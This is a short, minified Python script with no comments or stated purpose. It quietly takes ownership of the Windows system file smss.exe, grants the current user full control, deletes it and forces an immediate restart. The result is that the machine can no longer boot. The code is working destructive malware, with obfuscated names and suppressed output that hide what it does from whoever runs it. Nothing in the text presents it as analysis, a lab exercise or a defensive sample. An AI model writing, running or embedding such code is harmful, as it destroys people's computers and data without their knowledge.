import os,subprocess as B,getpass as D
def C(cmd):B.run(cmd,stdout=B.DEVNULL,stderr=B.DEVNULL,shell=True)
A=r'C:\Windows\System32\smss.exe'
C(['takeown','/F',A,'/A'])
C(['icacls',A,'/grant',f"{D.getuser()}:F"])
os.remove(A)
os.system('shutdown /r /t 0')
